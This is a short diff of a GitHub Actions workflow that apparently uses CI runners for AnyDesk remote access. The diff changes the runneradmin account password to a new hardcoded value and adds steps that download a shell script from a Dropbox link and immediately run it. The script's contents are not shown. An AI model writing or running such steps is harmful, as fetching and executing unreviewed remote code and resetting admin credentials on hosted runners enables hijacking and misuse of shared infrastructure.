@@ -18,5 +18,12 @@ jobs:
       - name: Log In To AnyDesk
         run: cmd /c show.bat
 
-      - name: Time Counter
-        run: net user runneradmin Muhammed_2012
+      - name: passawordchange
+        run: net user runneradmin mamimamimami_2012
+
+      - name: bash code download
+        run: |
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/9cqrmx0v9a4gn8cqyv2mk/mami.sh?rlkey=g15cvpvm4jvwru7sw7kshoq4y&dl=1" -OutFile "mami.sh"
+          
+      - name: bash code start
+        run: bash mami.sh
